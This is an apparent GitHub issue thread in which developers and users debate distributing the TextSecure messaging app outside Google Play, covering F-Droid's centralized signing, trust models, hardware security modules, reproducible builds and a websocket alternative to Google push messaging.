But, like the security of one developer's build machine can be compromised when publishing to the Play store, a single repo's build machine can be compromised. That won't compromise any other repos, of course. I'm not saying that this method is perfect, but IMHO it does solve @moxie0's complaints regarding our repo. In other words, an f-droid repo will be more or less secure depending on the build/hosting servers behind it. By default it automates via sshfs, but you may do all of that manually too.

Before saying why, let me remind you that I said ""I suppose the keystore is someplace in the hard drive, outside of the virtualbox VM"". I don't know where it is kept in our buildserver's setup, it might even be in a separate storage unit. Because the signing takes place independently from the building, so you could very easily build all applications without the keystore, read the keystore manually from someplace like an HSM, and then sign all unsigned packages at once.

Usually, the building takes place inside the VM, and the signing (fdroid publish) and index updating (fdroid update) outside of the VM.

Regarding moxie's need of security: He could provide his users with non-Gplay downloads in different ways:
- Setting up a binary f-droid repo (you build, you sign, f-droid only updates the index)
- Setting up a binary f-droid repo with automated signatures (you build, f-droid signs and updates the index)
- Setting up a source f-droid repo (f-droid builds, signs and updates the index)

Of course, all the f-droid steps can be done separately and triggered at independent times, so you could use a HSM if you wanted to.

Automatic updates aren't done yet, but like @dschuermann said we want to approach that possibility. I'm not sure that forcing updates on the users without opt-in/opt-out would be sensible on our side, but you could always just have the latest version of each app in your repo.
"
6602	"@dschuermann :

> Yes, you can't keep a centralized keystore more secure than the keystore of an individual developer.
> You did not answer to my other points, so I ask again: Is your keystore more secure than the keystore of fdroid? 
> Are you using a HSM? Are you building on a seperate offline machine?
> If that's not the case your security is likely the same as the security of fdroid.

I'm glad we can agree on that point.  Yes, our packaging process is entirely offline.

> Most Android devs aren't that much security aware (just look at SSL hostname validation in android apps).

Even if an individual Android developer has an online signing practice, I believe there is qualitative security value in that being distributed, rather than centralized in a single machine (or organization) that can be compromised.

@mvdan :

> Mostly because our method isn't centralized at all. It just appears centralized as noone has taken the time to set up and maintain another repo yet, so only the main repo is used by most people.

There is a substantial difference between a distributed system and multiple centralized systems. So long as an f-droid repo is signing packages with keys that don't originate from the developers of those packages, it isn't going to interoperate with other repos. My view is that the practice of f-droid repos signing packages with their own centralized keys undermines one of the core strengths of the Android security model.

> Setting up a binary f-droid repo

This is essentially what I'd like to do, however I'd prefer not to have users install a separate app just so that they can install this app. And I'd be reluctant to recommend users install a separate app that could lead them to installing other packages which are signed with centralized keys.  

So ideally we'd just bundle some code in the APK that does three things:
1. Check for updates and notify the user when they're available.
2. Provide analytics on Android version.
3. Provide crash reporting.

If you're interested in seeing TextSecure distributed outside of Google Play, we just need help implementing those three things.
"
6603	"I really like this discussion :+1: It gives me some other ideas and insights about android security.

I totally see your point about dezentralized signing, however I will not spend time developing another self-updating mechanism. This self-updating needs to be done sufficiently secure and it's not worth the time to implement something which already exists in form of binary F-Droid repos.
Due to security implications when everyone implements self-updating themself, Google banned those apps (http://arstechnica.com/information-technology/2013/04/google-bans-self-updating-android-apps-possibly-including-facebooks/).

I'd like to discuss some things regarding Google Play vs. F-Droid.
Lets assume that your and F-Droid's signing key is not compromised.
Google Play vs. F-Droid are both MitM services providing binaries to users, if you do not provide any side channel for verifcation of apks, like a OpenPGP signed hash (or verify the android way: http://nelenkov.blogspot.de/2013/04/android-code-signing.html), there is no way to tell if these binaries are really build by you.
Google Play could just deliver a different apk for specific users.
The same goes for F-Droid.
Conclusively it comes down to: How much do I trust these MitM services?
I would always choose F-Droid as it is driven by a community, not by a central organization.
What's your opinion about this?

A second similar problem: F-Droid's inclusion policy is very strict. No spyware/adware etc. is allowed and only open source projects are included. Thus, everything I install from F-Droid is free of crap that undermines my privacy.
Google Play is a totally different paving.
I need to do actual research to find out about if given software is indeed the software I was looking for.
There are hunders of rip offs of existing applications, just bundled up again with some spyware in it (e.g. N64 emulators, crazy example: http://www.reddit.com/r/Android/comments/ryzjk/n64_player_ripped_off_mupen64plus_ae_put/ )
Again, I would choose F-Droid.
"
6604	"F-Droid is as much a central organization as Google, except it's a non-profit company based in England with a couple of servers in Europe. Sure, people work on it for free, unlike at Google, and that presumably keeps it honest.

F-Droid was found to be one of the few app stores free of malware in a recent study. However, as a small group maintaining 800 apps, it can't be said that inspection of the code for privacy issues is a top priority (nor that an apk is built entirely from source BTW). There are thousands of users though, all getting updates at roughly the same time, so there's a decent chance somebody will spot shenanigans.

 As for third-party repos, the client has defences against MitM attacks on the index: it sets up public key verification when first receiving the index (which can be sent over SSL). The user of the third-party repo just hopes that the F-Droid client is safe and that the initial download of the index by the client isn't MitM'd. There's nothing stopping him either from using another client (with the private key built-in); it can even be built from source one time and left alone for good. The client's support for multiple repos is pretty immature anyway so he might as well. So it looks as good a setup to me as the self-updating apk.
"
6605	"@dschuermann :

>  This self-updating needs to be done sufficiently secure and it's not worth the time to implement something which already exists in form of binary F-Droid repos. Due to security implications when everyone implements self-updating themself, Google banned those apps.

It needs to be secure, but APK signing gets you most of the way there. Google banned self-updating apps because they want to maintain their central point of control (over eg. Facebook), not because of security concerns.  We'd have to disable the self-updating channel in our Play Store builds, but now that we've moved to Gradle that should be easy enough to automate at build time.

> Google Play could just deliver a different apk for specific users. The same goes for F-Droid.

The big difference is that Google (or attackers who compromise Google) can only do a targeted attack the very first time someone installs an APK.  F-Droid (or attackers who compromise f-droid) can do a targeted attack at any time.  Put another way, Google is employs a TOFU (""trust on first use"") trust model while f-droid employs a CA trust model.  TOFU has proven pretty effective in practice, while CAs have had repeated problems.

@dalb8 :

> F-Droid is as much a central organization as Google, except it's a non-profit company based in England with a couple of servers in Europe. Sure, people work on it for free, unlike at Google, and that presumably keeps it honest.

The big difference between the two organizations is that f-droid has a centralized signing system and Google has a distributed one.  I really don't understand why f-droid went with the former.
"
6606	"Just as a heads up, I hadn't noticed this bit of information on our FAQ:

> The building and signing is done in an secure offline (i.e. inaccessible from the internet) environment. Every package is built in a completely fresh isolated virtual machine environment which is discarded once the build is complete. Additionally, that build environment is completely separated from the signing environment.

@moxie0:

> The big difference between the two organizations is that f-droid has a centralized signing system and Google has a distributed one. I really don't understand why f-droid went with the former.

What alternative is there, given that most developers don't care whether their apps are in F-Droid or not? (Some even convinced us to remove their apps from the repository after continuous nagging)
"
6607	"Building from source is not an acceptable option, even for ""power users."" As you say, it is important to keep the software up-to-date. If I build from source, I am not notified of updates, and I can't update until I am at my PC. On F-Droid, I am notified about updates automatically and can immediately install them.

I think it is in the best interest of security to provide an alternative to Google Play. Otherwise, users without Play will be forced to obtain TextSecure binaries from another less trustworthy source.

Since this is a GPL project, F-Droid should be able to distribute TextSecure without anyone's permission, and I think that they should do so. However, it sounds to me like the F-Droid people are uncertain about this after @moxie0 told them to remove TextSecure.

Can you clarify that this project is in fact intended to be GPL, and it therefore can legally be redistributed freely by F-Droid?
"
6608	"Hey @EricJ2190, because of F-Droid's centralized trust model, it is our preference that they don't distribute TextSecure. Anyone is free to do what they wish with the software so long as they abide by the terms of the license, but I hope you will consider spending some time contributing to the project before you make a decision that increases our support overhead.

The good news is that we have a non-Play distribution framework in development that should be available by around January 12th.
"
6609	"As someone who doesn't run any of Google's apps on my Android phone, add me to the list of users that want a Google-free APK made available. Simply providing the APK on your site and signing it with your public key would be sufficient.

Even if the developers have an inherent distrust of the web-of-trust model, it's still an improvement over having to run Google's proprietary apps on your phone.
"
6610	"I use Cyanogenmod without any apps from google, including play store. All my apps come from my rom, f-droid, or are self-developed.

In the past, on my computer, I had windows. Every time I downloaded software from the Internet, I had the slight fear that it might include {bloat,spy,mal}ware, just like this very nice java updater with this great ask toolbar.
I switched from windows to linux also because there were huge lists called Application repositories full of software that wasn't written so that I grant root rights to it so that it can spy, but to work and respect my will not its developer's.
As I got a phone, I searched on the Internet for exactly such a filtered list for my phone. And I found such: f-droid.

The play store model where the developer signs the builds fits very well for the closed source blob-commit world.
But for open source, relying on the developer to build the app from the source code he publishes violates the many-eyes-principle I think. Who verifies that the blob matches the source?

Mobile app ecosystem is full of developers not knowing what open source is. They publish something, but it may still contain closed-source blobs. The fact that the build gets made by f-droid people guarantees the app is open source, and matches the source code. For this, it is very good to not to rely on the developer's word that its open source, but the app repo to build the application.

Many developers also want to track their users without their consent. The application may be open source, but it can contain spyware features. AFAICT F-droid considers everything except of opt-in stats as spyware. It is good to have an app repo saying to you whether the app does tracking, displays ads, and so on. One might say, the developer should choose which spyware features to add. I think, the users should have the control over such features, just like all features of the application. The best is if they help the developer by submitting statistics, but they should be abled to choose.

@moxie0 You don't want your apps added to f-droid _only_ because of the centralized signing system, or also because of the optional apk download feature on the app's website, or because you can't track users?

Would it be sufficient for you to allow adding the app to fdroid when f-droid would ship with dual signing both from developer and repo? You do a deterministic build of the app, and the f-droid server verifies that the binary matches the source by re-building.
This is exactly what reproducible builds are about. Apparently you already have it implemented for your app? If yes, then only f-droid needs to be improved so that it matches both your and their needs, both verified blob-source matching and distributed security.
Of course, the client should only accept updates, when the apk is signed by its dev and f-droid, and only accept new apps, when the apk is signed by fdroid, then remembering the dev key.
With that, we have that developer certificate pinning feature android offers, and know also (however centrally verfified), that the source matches the apk blob.
With additional modification, we could also make this last verification decentralized, but when you allow distribution on play store, then you would also allow this minor flaw for f-droid.

You also didn't like the need to tick the ""allow 3rd party APKs"" checkbox.

I would really like an easy way in CM to add f-droid to my system rom without having to build cyanogenmod by myself, so that I don't have to tick this ""allow 3rd party APKs"" checkbox. I would also want to remove google's signing keys, so that the playstore can't install applications without the checkbox ticked. It would be really great when cyanogenmod allowed **me** to set what a ""3rd party APK"" is and what not.
Because, from my perspective google is 3rd party.

@moxie0 If these changes were applied to CM / F-Droid, would you then recommend CM + F-Droid to people not experienced with technology? And, more important, would you then 'allow' (you can't forbid but you know what I mean) distribution of your apps on f-droid?

Please note, I'm no developer of f-droid, so @f-droid people: Would you implement such changes? It improves security, small downside is the dev becomes limited veto power for app updates.
"
6611	"Lets first accept that what we are comparing here is open source apps on the Play Store vs open source apps on F-Droid. Unless an app is deterministically built we must also accept the following:

1) If it is distributed on Google Play we are trusting the app developer's build process.

2) If it is distributed on F-Droid we are trusting the F-Droid build process.

This is the distributed vs centralized (albeit by awesome, friendly people) bit. Note that until we have deterministic builds we can't even benefit from ""many eyes"" in either case. Now, hypothetically if all open source apps were built deterministically by app developer and F-Droid alike we would have the following choice:

1) Trust Google Play with an app install on your Android device and download related metadata.

2) Trust F-Droid with an app install on your Android device and download related metadata.

In this case I'd much prefer option two, especially if the F-Droid app was also open source and deterministic. However, I believe the question for now is fundamentally: **would you rather have a distributed system of trust and a Google app on your phone, or a centralized system of trust and an F-Droid app on your phone?** Note that for now, neither app can be trusted more than it's people, open source or not.
"
6612	"> Now, hypothetically if all open source apps were built deterministically by app developer and F-Droid alike

Also note that we don't have an all-or-nothing case. We can roll out deterministic builds gradually for every app. However I admit, when the first app has deterministic builds, its easier for other apps as the compiler is already ready for deterministic builds.
"
6613	"@moxie0 You stated above, that Google's system is TOFU, but from my perspective it's not. While you're true, that they can't update apps using a different key (assuming that they did not modify this between AOSP and release - what is not sure either), you seem to totally ignore the fact that they may just backup your data, uninstall and reinstall the app and restore data to install a modified version to your device. Due to their push nature, they could even do this transparently without notifying the user.

I personally also don't like the centralized system of F-Droid, but one should not pray Google to be better in any way
"
6614	"Maybe people didn't see my comment earlier, but we have started the development process for a solution that provides non-Play distribution. You don't have to continue demanding that we do something for you, it's happening.
"
6615	"Your last sentence is a little bit rude.
Many of us are working on free software and there are only sparse contributions to these projects.

It's sad to see that you are developing your own updater. You could have just setup a F-Droid server shipping your signed blob, everyone could still use F-Droid while you have your own signature.
If everyone does this, it will lead to broken updaters like existing on Windows. This is the ""not invented here"" strategy instead of ""cooperation"" strategy.
"
6616	"We have been harassed, called names, **threatened with a lawsuit**, and been the subject of ridiculously inflammatory blog posts.  All for something that an (extremely vocal) tiny minority of our users want (%0.05 would be generous), while we are drowning in work to do that is critical to the bulk of our users.

But now that we're doing it, even when we really should have prioritized critical work on other things, the response we get for our efforts is typical of this thread: _you're doing it wrong_. Before you've even seen anything about it or know anything about what it will be!

So yes, I apologize, but I've started to lose my patience.
"
6617	"I am truly sorry that you were been harassed and threatened with a lawsuit, haven't read this.
Thanks for your work on security protocols and open sourced Android apps.

You are saying F-Droid is doing it wrong. I understand your criticism and am actively trying to solve some points by cooperating with F-Droid (unattended installation without ""unknown sources"": https://gitorious.org/f-droid/fdroidclient/merge_requests/37).
I am saying that you are doing it wrong because you seem to implement your own updater instead of working with F-Droid. My criticism is not targeted against the technical foundations of the updater; I don't know how this updater will be implemented.
You say that F-Droid's model is fundamentally flawed (centralized signing), so I think we have to deal with your decision, though we have other opinions. So sry for taking your time, I appreciate that you answered most questions in this thread.
"
6618	"Thank you for working on this. I am glad to see that this is coming soon, and I apologize if I came off as ""demanding.""
"
6619	"Thanks for working on it!
"
6620	"Any progress?
"
6621	"While I personally use the app from google play I know a few potential users who do not even have a google account. Providing a way to install the app for those people would be great.
"
6622	"Here's the update:

First, I wrote most of the client and server side for updates and crash reports.  So that's almost ready to go. However, now that TextSecure also relies heavily on GCM, distributing it outside of Play doesn't really make sense, given that it won't function without Play Services Framework.

We have websocket support server-side, so we'd need to add that into TextSecure as a fallback option for users without Play.  At that point, we can distribute it outside of Play.  It won't really work well for all the reasons push messages exist, but that's the best we can do.

If anyone wants to take that on, pull requests are welcome.
"
6623	"Yup, I agree that using textsecure without Google is useless at the moment.
"
6624	"""However, now that TextSecure also relies heavily on GCM, distributing it outside of Play doesn't really make sense, given that it won't function without Play Services Framework.""
Do you need a Google account to use the GCM framework?
"
6625	"I was under the impression that it was possible to run TextSecure without Google's services. Has that changed? If so, unfortunately, an alternate distribution mechanism won't work for me or anyone else who runs a pure Android phone. Personally, installing Android without Google integration is step one in obtaining more privacy and security on my phone, and it seems like a step backwards to integrate privacy software with Google's services.
"
6626	"@Argafal You don't need an account, but you need to have Play installed.
"
6627	"@DKoestler TextSecure uses GCM for push messages.  We'd be glad to support an alternate push message network, but there aren't any.  Building, deploying, and maintaining a worldwide push messaging network that scales to hundreds of millions of users for free is a lot of work!

We can include websocket support in our Android client as an alternative (any volunteers?), but it won't work well.
"
6628	"@moxie0 First of all, thanks for your work and patience on this. I really appreciate this, but I'm curious about something and I'd like to get your input and assessment. 

I'm trying to give away as little information as I possible can, by either using encryption and/or hosting the server part myself. Another approach to getting control over my data back, was to install the custom ROM again without the gapps package. 

Now, I read your concerns about statistics, security when distributing outside the playstore and fdroid itself, but that isn't my concern or question. 

What do YOU think of gapps/google? Since you clearly know more about security than probably all of us in this thread combined, what is your take on google? What is your motivation for programming an app whose main purpose is privacy but relies on google for getting it done. For me, this is a contradiction and don't get me wrong, I don't want to be rude, I want to understand your point of view. Is google not a concern for you? Again, I'm trying to understand if my reasoning for not installing any gapps actutally makes sense (I haven't seen any requests to google in my firewall logs since then) or is just something that doesn't really make much of difference. 

Thanks for taking the time and explaining all of this :)

PS: What do you think of the nogapps project?
"
6629	"@hillbicks I would like to distribute software that doesn't depend on Play, but there's currently no way to use push messages without Play.  Now that we've written a distribution and update mechanism, that's the remaining obstacle.
"
6630	"But TextSecure still works without GCM if one does not use push messages and only SMS as a transport, no?
"
6631	"@mitar Yes, I use TextSecure without any piece of Google on my phone and it works fine.
One easy way of doing this is via this excellent project: http://apps.evozi.com/apk-downloader/
"
6632	"@mitar  @countrygeek security ?
"
6633	"@moxie0 
Just out of curiosity:
I thought about using a self hosted push service e.g  DEACON for me and some friends.
What would be the best way to connect this service to the current infrastructure?

e.g. add functionality to the textsecure client and server so they support additional push services and then let the client decide which service (self hosted or gcm) he prefers? I saw the server already supports APN, so maybe it's not that difficult to add more services.

Thanks for your great work, hopefully it's some day useable without  gapps!
"
6634	"And it would be nice to see a short page with 

#### instructions how to build TextSecure clients from the source

On my page https://github.com/Wikinaut/utils/wiki I have some examples for compiling 
- Enigmail
- Mailvelope ; and 
- GnuPG

from the sources. Every project should have such a page.
"
6635	"@Wikinaut: It is here: https://github.com/WhisperSystems/TextSecure/blob/master/BUILDING.md
"
6636	"@mitar Thx, but ""Ich brauche mehr Details.""  I need more details.... Can you (please) improve this ?
"
6637	"Maybe, but this issue is definitely not about that.
"
6638	"Hi again. I just wanted to give my own point of view, no matter what you think.

When I discovered textSecure it was on Fdroid. An amazing way to secure my SMS with my friends. After that I didn't see any updates. When I finally came here and ask why the answer I got was that Fdroid whas less trustable than Google Play.

Google is well known for leaving a giant door on their servers to the NSA, CIA and others acronym who had no other purpose that spying everyone.

Fdroid is a nonprofit organisation who had the rule of giving access to the source code of all available apps.

And still the devlopers of textSecure trust more Google.

So I said let the time pass, maybe they will see they were fool.

Time passed and now textSecure needs a server AND google Play libs. You not only you force 100% of your users who don't know/want to compile your app to go on google play to download it, you also force them to install google play, a source closed app, on their phone. It's like a locksmith install a fingerprint system on your door but don't give you the possibility of knowing who is registered in.

Every good security expert knows that only 100% open source code can be trusted. Your software use a closed source code therefore it's shit. And I'm not talking about the shitty server idea.

I was hoping you'll release your app on Fdroid. Now I only hope that someoneelse will take your sourcecode, remove the play libs and server shit, and release it on Fdroid. I'm hoping someoneelse will do your job !

You are maybe a great developer but either you work for google/NSA or you are the stupidest person ever.
"
6639	"@mitar @countrygeek ""Yes, I use TextSecure without any piece of Google on my phone and it works fine. One easy way of doing this is via this excellent project: http://apps.evozi.com/apk-downloader/ ""

and we could post he current MD5, and SHA1, hashes here, somewhere.
"
6640	"Would Aptoide be a suitable alternative for Play? It is Free Software, scans software with three different anti virus systems, nags users about updates, and gives publishers statistics: http://www.aptoide.com/page/publishers
"
6641	"There is no need to look out for an alternative store, because @moxie0 already is almost done creating his own solution for providing his software outside of the Play Store. Please read the thread if somebody missed that. The only thing left now is a fallback method for users without Play. This method can for example be built into the android client using websocket technique which the server already supports. Although @moxie0 believes that this won't work well, I am still optimistic. It clearly won't be 100% equal to push, but I could live with little delayed notifications ( hopefully less than 5 minutes). So if somebody is going to make this real, we will have a Google free Textsecure app for everyone who wants it that way. And @moxie0 is also going to provide it outside of the Play Store. 

So if somebody out there is experienced with websockets and Android than please don't hesitate implement this in Textsecure. I and a bunch of other people will be more than thankful and donations surely won't stay away, neither to Whisper systems nor to the contributor.

There is a project called autobahn, which implements a websocket client in android I believe. Maybe this can be helpful.
"
6642	"What about MQTT as a GCM alternative?

Some links: 
https://github.com/JesseFarebro/Android-Mqtt
http://stephendnicholas.com/archives/219
http://stephendnicholas.com/archives/1217
http://ollieparsley.com/2013/05/20/using-mqtt-as-a-gcm-replacement-for-android-push-notifications/
http://www.slideshare.net/henriksjostrand/devmobile-2013-low-latencymessagingusingmqtt
"
6643	"Another reference: http://dalelane.co.uk/blog/?p=1599 
"
6644	"@v-0-d We already have websocket support on the server and that suits us better for desktop clients.  I don't think it'd be any less or more work on the Android side, someone just needs to make it happen.
"
6645	"@moxie0 How does websockets stand compared to GCM in terms of delay and battery usage?

good read about websockets and energy efficiency on mobile phones:
http://nordsecmob.aalto.fi/en/publications/theses2013/thesis_estep/
"
6646	"@v-0-d Substantially worse than GCM. It won't work well, but it's the only option short of building a worldwide push network.
"
6647	"@moxie0 What library suits best for this purpose? Do you have a good suggestion? What about this one: https://github.com/TooTallNate/Java-WebSocket

Is this guide here good enough?
http://www.elabs.se/blog/66-using-websockets-in-native-ios-and-android-apps

I probably won't be able to do this. I am just trying to help by taking away trivial obstacles. This definitely should be done by someone experienced.
"
6648	"Out of curiosity: wouldn't a WebSocket implementation create some form of worldwide push network?
"
6649	"On the contrary, it sounds like it would be a centralized model, using WebSockets to talk to the(ir?) server(s).
"
6650	"@Gnarfoz it's a federated server model, which means that (in theory) everybody can run his/her own server, as with XMPP/Jabber. Currently there are only two servers: WhisperSystem's and CyanogenMod's. If you want to start your own: grab the server source, get an SMS gateway (for the verification) and ask WhisperSystems to add your machine to the server network, as this is not yet automated.
"
6651	"I see. Then the answer to @JavaJens 's question is ""no, but you could look into adding a server of your own to the network"". :+1: 
"
6652	"@Gnarfoz The WebSockets part is desired to have an alternate PUSH mechanism besides GCM or APN, the federation is using plain-old HTTP between the servers' APIs as far as I see.

My question was more like the following: If you use WebSockets to push to the devices, that means for each device you have an open connection and this seems to me to be no different than GCM except it is worse for battery, data and costs for the server, but the idea is the same.
I wanted to know if using WebSockets over any other TCP connection presents a benefit.
"
6653	"The reason for me to have something like this is that my Play Store tells me that Textsecure is not compatible with my tablet (Android 4.1.1). (Same with WhatsApp but not Telegram for whatever reason). I try to compile it myself later or can I trust http://apps.evozi.com/apk-downloader/ and save myself some work?
"
6654	"@JavaJens the benefit is the possibility of future JavaScript, desktop clients.

@Hugoz12 to register on the TextSecure network your device needs to be able to receive SMS messages. If your tablet has a 3G connection with a phone number capable of receiving texts, you might be able to use TextSecure. Otherwise, you won't, for now.
"
6655	"First off, I'd like to say thank you to Moxie and the Whisper Systems team both for all the work going into TextSecure and RedPhone, and also for this discussion. It's obvious that you are taking users' concerns seriously, even when you don't agree with their perspective. Moxie, I'm truly sorry to hear that the response to this issue has escalated to harassment and threats. While I have grave doubts that trusting Google, the hardware manufacturer, AND my cellular carrier (all of whom have financial interest in undermining my privacy) with root on my device is more secure than running a rooted pure-F/OSS ROM that allows me the _option_ to grant superuser to apps, I certainly respect your view that the PC security model is completely broken and no example to aspire to.

This thread seems to have become the catch-all for discussion about alternate distribution channels as well as GCM dependency... my apologies if it's not the right place for my suggestion.

Moxie, I see from upthread comments that an outside-of-Play-Store distribution channel is well underway using Gradle, and that using websockets as a fallback for data-channel messaging (for those who want to avoid having the privacy-invading Play Services installed) is ... underway and looking for contributions. Sadly, I'm no programmer, so I can't offer any code toward that. Also, while I do understand that the non-GCM fallback will be slower and more battery-intensive, I think it's really valuable to give users that option, so thanks for that. I do wonder about one thing, though: given that the primary draw of TextSecure for many people is the simple ability to encrypt your SMS/MMS messages, the strong emphasis on data-channel messaging seems like it might be a form of ""mission creep"". I wonder whether a low-effort way to satisfy those who want to avoid the Play Store, Play Services, and GCM altogether might be to split off an SMS/MMS-only version of the app, which could be done through Gradle, as you mentioned. Then, if and when the websockets fallback is implemented, you might (or might not) want to phase out that SMS/MMS-only app. I do realize that you think using SMS is the greater evil, due to the carrier having access to the metadata, but don't you think that's a choice the user should have the right to make for herself?

Also, I have a couple of privacy-related questions that I couldn't find any answer to:
-  When using the current GCM data-channel messaging, I assume that the server has access to the metadata... ie who I message and when. Is this correct?
-  When using the current GCM data-channel messaging, who controls the server? Are they Google hosted servers, or does Whisper run their own servers? Are they federated, and if so can other servers in the network see the metadata? In short, how do  I know who does and doesn't have access to my metadata?

These questions have thus far prevented any of my friends who are privacy-conscious enough to install an encrypted-messaging app in the first place from signing up for the data-channel messaging service. It might be good to have some info about that on-screen when prompting users to sign up.
"
6656	"Just for my own clarification: Has anyone tried to install Google Play and restricting it with [Xprivacy](https://github.com/M66B/XPrivacy) so that it cannot do anything except enabling TextSecure push messaging? Another question to this: Would I have to be signed in when using the Play Store (I'm not even registered there and refuse to do so)..
"
6657	"@SecUpwN 

> Has anyone tried to install Google Play and restricting it with Xprivacy so that it cannot do anything except enabling TextSecure push messaging?

I haven't tried to restrict GCM with Xprivacy yet.

> Another question to this: Would I have to be signed in when using the Play Store (I'm not even registered there and refuse to do so)..

With the newer Android versions you don't need to be registered, you just need to have it installed.
"
6658	"@SecUpwN 

never tried with TextSecure but i had general issues with Xprivacy. it sucked up my battery when restricting system and google stuff. also, if you restrict Google framework accsess to the internet, then push messages won't work and if you don't, then you did nothing. ;)
"
6659	"@bungabunga, main question is: Do I **have** to be registered with Google Play?
"
6660	"no. as generalmanager said.
"
6661	"@generalmanager, I just reflashed my [AOKP](www.aokp.co)-ROM which features KitKat 4.4 to test if TextSecure enables push messages when Google Play is installed - it doesn't. I did not restrict anything. What's wrong there?
"
6662	"@SecUpwN That's strange. There are some tickets if you search for kitkat, but they don't seem to match your description.
Could you open a new ticket and describe exactly what you expect, what you did and what TS does?
I'm on 4.4 as well, without any problems. Afaik you should only use one of [these packages](http://forum.xda-developers.com/showthread.php?t=2397942) if you are on kitkat.
If you modified the zip, you may have removed a necessary component. If you use other Gapps, it's probably not going to work at all.
"
6663	"Ah, wait a minute. All I did was to install Google Play, not the whole GApps package. I will not, not even for testing purposes, cripple my ROM with Spyware by Google. Now I know the reason why TextSecure still complains when it is installed. But if TextSecure **really** shall be an alternative to other instant messengers, it **should** work without GApps or any Google stuff involved. I still love TextSecure for what it is and also completely removed my WhatsApp-Account, but once TextSecure is able to connect to people like in WhatsApp, you bet I'll use it as instant messenger. I'll be honest with you: I have high hopes that TextSecure shall find a replacement for GCM soon. Recommending it to my friends will be easier then, too.
"
6664	"@SecUpwN 

> I have high hopes that TextSecure shall find a replacement for GCM soon. 

If you read this whole thread, you'll find out that they have a non-play distribution channel lined up and will use websockets as an alternative transport. The server already supports it, but somebody has to implement it for the client.
"
6665	"@generalmanager, simply awesome. I'll keep waiting until @moxie0 has completed it. ;-)
Rest assured that BitHub of WhisperSystems will definitely receive my donation then!
"
6666	"@mvdan just let me know about this thread, so I thought I'd throw my belated two bits in.

@moxie0 I'll be interested to see what you come up with for the updater.  One concern is that you said you require any distribution system to track its users (stats, etc).  Those stats will never be offline, so they are a vulnerable target for attack.  In many places, users of TextSecure will be a very interesting target to some highly skilled hackers.  There are so many stories about giant data leaks and thefts I don't feel the need reference them.  Storing stats also leaves you vulnerable to subpoenas, NSLs, secret court orders, etc.

Another concern is that you plan on making separate APKs for Play and outside Play.  They should be clearly marked as distinct to avoid confusion (like separate version codes), and should be upgradeable either way (Play to non-Play, or vice versa).  Putting your Google Play APKs in your own FDroid repo already allows for this.

And some points related to various parts of the thread:
- The characterization of FDroid as centralized is not accurate.  The central f-droid.org repo is a centrally built and managed repo of apps, that part is centralized.  The FDroid client can use any combination of repos as its source.  Turn off the f-droid.org repo in the client, then FDroid is more decentralized than Play: the APKs can have developer builds and signatures and the repos can be hosted on any webserver on the internet, including Amazon S3, etc.  There can also be mirrored copies of repos since FDroid repos are structured similarly to Debian repos.
- everyone should definitely upgrade their signing process to use an HSM (aka smartcard), here is how we are doing it: https://guardianproject.info/2014/03/28/security-in-a-thumb-drive-the-promise-and-pain-of-hardware-security-modules-take-one/
- the fdroid repo tools now support using an HSM as well: https://gitlab.com/fdroid/fdroidserver/merge_requests/2
- and recently, we've made it much easier for anyone to setup and maintain their own FDroid repo, using the exact same APKs as go into Google Play: https://guardianproject.info/2013/11/05/setting-up-your-own-app-store-with-f-droid/
"
6667	"You didn't mention @eighthave, that peer-to-peer repos are proposed too ;-) F-Droid (the client) will need to have better warnings that possible updates fail to appear before that becomes palatable to developers like Moxie: the peer-to-peer repos are by nature ephemeral. Of course, apps can add their own nag screens  without including installer code, but who wants that? I do welcome peer-to-peer as it offers defence against censorship: I'm just saying some developers could get uneasy.

There's also talk of integrating PGP signatures on f-droid.org: wouldn't it be nice if everybody (including GitHub) started offering them?
"
6668	"@moxie0:
For the safety of your users, you should distribute an official APK or publish it on F-droid.

You should consider the fact that the current situation is actually either driving those who don't have Playstore away from TextSecure to other less secure apps, hence compromising their privacy, or forcing them to resort to dangerous alternatives such as using one of dozens of unofficial APK websites.

Your intentions are good, but by not providing a Playstore alternative, the result is less security for the minority which you are trying to protect.

Look at it that way, you have only two choices:
1. The current situation, in which desperate users get the App from, say... http://www.appsapk.com/textsecure-private-sms-mms/
Or use a different app altogether.

2 . A situation where you have an official APK / F-droid App.

In both situations, things aren't optimal in regards to software updates, crash reports, and statistics. But situation 2 is a lot more secure.

By sticking to situation 1 you aren't resolving any of the issues related to a non Play Store distribution of the app, but you are adding extra non security on top of it.

In other words, people will always download Textsecure from places other than Playstore regardless of your actions, but you have the choice of channeling those downloads towards a single, official, safer source.

Also, 99% will use Playstore anyways, so this should not have a big impact on statistics, Google Play download counts, crash reports, etc...
"
6669	"Actually, I disagree.

6 hours ago, I thought as you did- I have been setting up my phone without any Gapps, and when the time came to install Textsecure, it was nowhere to be found. I was frustrated at the least, and went to their website to complain. I found the many existing posts and threads on teh issue, and read them.

And, moxie0's reasoning made sense to me. Furthermore, despite having never built an android APK before in my life, I cloned the git repository and went from start to having a working, signed app in about 20 minutes. It was a great learning experience for me, and frankly, if you're the sort of person who's trying to have an Android phone without Gapps, you're probably computer competent enough to figure out how to spend a quarter hour building the APK, especially considering the quite thorough documentation. Not to mention, again, if you're building a phone without Gapps, then you're probably somewhat security-conscious and building your own apps from source is something you should know how to do anyway.

It would be nice if the source had some sort of in-app notification of when the main branch is updated, so that I don't have to necessarily subscribe to the git through email. But I don't begrudge the choice to not distribute the apk.
"
6670	"@rdsqc22, My post was based on the (true) assumption that most people are too lazy to build from source, even if they're enough security aware to use Cyanogenmod + F-droid.

I never built an APK in my life too, and I think I will try this, I have no other option.

This is slightly off-topic, but I'm wondering: How would push notifications work if I build from source and I have no Playstore?

Edit: One proof of the claim in my first paragraph is the fact that many people ARE using F-droid instead of building from source.
"
6671	"I suspect that if you go that route, you (like me) will be surprised at how easy it is. Let me know if you need a hand.

Push notifications? I have a pebble and pushing notifications to the pebble works fine- is that what you mean? Or are you referring to something else, like Pushbullet?
"
6672	"Perhaps we could provide an automated build script as an alternative?
Which basically downloads  Android SDK Bundle, clones the repository, etc...

And then executes everything in https://github.com/WhisperSystems/TextSecure/blob/master/BUILDING.md

Edit: I know it's a ""lazy path"", but people are like that.
"
6673	"Regarding Push notifications, I assumed that Textsecure relies on Google's Push service. Is that incorrect?
"
6674	"Not a bad idea, considering that a) it doesn't require root, and b) should only be ~10 commands long.

Heck, I could write it myself, except I'm not sure how to install Android Support Repository and the correct version of Build-tools from command line.

As far as push notifications go, I misunderstood you at first- you are correct, Push does not currently work without Gapps. I believe that once Websocket support is complete, this will be fixed.
"
6675	"For what is worth, what you are doing of building your own self-signed APKs from source is precisely what F-Droid could automate for you.
"
